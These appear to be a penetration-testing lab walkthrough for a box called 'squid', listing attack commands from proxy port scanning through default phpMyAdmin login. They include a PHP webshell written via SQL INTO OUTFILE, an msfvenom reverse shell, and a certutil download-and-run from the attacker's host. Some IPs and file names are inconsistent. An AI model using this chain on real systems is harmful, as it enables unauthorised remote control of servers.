# squid 
# date 2-8-2023
# ip 192.168.191.189


# nmap
 PORT     STATE SERVICE
3128/tcp open  squid-http

 sudo nmap -p- -sS -Pn 192.168.191.189
 nmap -p 3128 -A -T4 -Pn 192.168.91.189


http://192.168.91.189:3128




# squid proxy
python spose.py --proxy http://192.168.191.189:3128 --target 192.168.191.189
192.168.191.189 3306 seems OPEN 
192.168.191.189 8080 seems OPEN 

after setting proxy to our browser we can acces
http://192.168.191.189:8080/



# dirb
dirb http://192.168.91.189:8080 /usr/share/wordlists/dirb/big.txt -p 192.168.91.189:3128


# enum
http://192.168.191.189:8080/phpsysinfo/
We start off by trying default phpmyadmin creds, which can be found with some quick research
http://192.168.191.189:8080/phpmyadmin/index.php
root:NULL


# exploitation
select "<?php echo shell_exec($_GET['c']);?>" into OUTFILE 'C:/wamp/www/webshell.php'
http://192.168.191.189:8080/webshell1.php?&c=whoami
we got webshell
# stable shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.91 LPORT=1234 -f exe >shell.exe
We also prepare a multi/handler listener using msfconsole with the appropriate options set to catch the msfvenom payload

http://192.168.191.189:8080/webshell.php?&c=certutil.exe -urlcache -f http://192.168.45.167/shell.exe shell.exe
192.168.191.189:8080/webshell1.php?&c=shell.exe